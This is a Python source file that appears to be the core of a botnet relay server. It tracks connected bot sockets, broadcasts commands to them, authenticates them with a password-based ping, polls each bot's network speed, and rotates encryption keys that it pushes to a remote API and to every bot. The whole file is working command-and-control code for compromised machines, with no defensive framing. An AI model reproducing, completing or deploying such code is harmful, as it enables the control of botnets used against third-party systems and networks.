from time import sleep
from requests import (
    get as rget,
    Response,
)
from socket import socket as Sock
from cryptography.fernet import Fernet
from .config import RelayConfig

class Core():
    def __init__(
        self, 
        config: RelayConfig = RelayConfig()
    ) -> None:
        self.config = config
        
    def log(
        self,
        data: str,
    ) -> None: 
        if self.config.debug: print(data)
        
    def crypt(
        self,
        msg: str,
        encrypt: bool = True,
    ) -> bytes:
        if encrypt: msg = self.config.fernet.encrypt(msg)
        else: msg = self.config.fernet.decrypt(msg)

        return msg

    def send(
        self,
        s: Sock,
        data: str,
        escape: bool = True,
        reset: bool = True,
    ) -> None:
        if reset: data += self.config.COLOR_RESET
        if escape: data += '\r\n'
        data += '\x00' # sign the end of a message for the bot

        s.send(data.encode())

    def broadcast(
        self,
        data: str,
    ) -> None:
        self.log(f"send {data}")

        for bot in self.config.bots_sock.keys():
            try: self.send(bot, f'{data}', False, False)
            except Exception:
                self.config.bots_sock.pop(bot)
                bot.close()

    def ping(self) -> None:
        while 1:
            for bot in self.config.bots_sock.copy().keys():
                try:
                    bot.settimeout(3)
                    self.send(bot, 'PING', False, False)

                    data: str = bot.recv(1024).decode()

                    if data != f'PONG[p:{self.config.PASSWD}]':
                        self.config.bots_sock.pop(bot)
                        bot.close()

                except Exception:
                    self.config.bots_sock.pop(bot)
                    bot.close()

            sleep(self.config.relay_time.PING)

    def net(self) -> None:
        while 1:
            for bot in self.config.bots_sock.copy().keys():
                try:
                    bot.settimeout(3)
                    self.send(bot, f'NETSPEED', False, False)

                    data: str = bot.recv(1024).decode()

                    try:
                        if not int(data):
                            self.config.bots_sock.pop(bot)
                            bot.close()
                            continue

                        self.config.bot_speed = int(data)

                    except Exception:
                        self.config.bots_sock.pop(bot)
                        bot.close()

                except Exception:
                    self.config.bots_sock.pop(bot)
                    bot.close()

            sleep(self.config.relay_time.NET)

    def set_swap_key(self, swap_key: str) -> bool:
        url: str = f"{self.config.API_URL}/swap_key?urlkey={self.config.URL_KEY}&key={swap_key}"
        try:
            res: Response = rget(
                url,
                timeout=5000,
            )

            return res.status_code == 200

        except Exception as e:
            self.log(f"error \n{url}\ngetting: {e}\n\n")
            return False

    def gen_swap_key(self) -> None:
        while 1:
            sleep(self.config.relay_time.GENKEY)

            new_swap_key = Fernet.generate_key().decode()
            self.log(new_swap_key)

            self.config.swap_key = new_swap_key

            swap_key: str = None
            is_first: bool = False

            # if the old swap key already exists, we encrypt this one with the old
            if self.config.swap_key_old is not None:
                f: Fernet = Fernet(self.config.swap_key_old)
                swap_key = f.encrypt(f'GKEY:[{new_swap_key}]'.encode()).decode()

            else:
                is_first = True
                swap_key = self.crypt(f'GKEY:[{new_swap_key}]'.encode()).decode()

            # send the new swap key to the api
            if self.set_swap_key(swap_key): self.log("apikey op")
            else: self.log("apikey error")

            for bot in self.config.bots_sock.copy().keys():
                try:
                    bot.settimeout(3)

                    if is_first: self.send(bot, f"GK{swap_key}", False, False)
                    else: self.send(bot, swap_key, False, False)

                except Exception:
                    self.config.bots_sock.pop(bot)
                    bot.close()
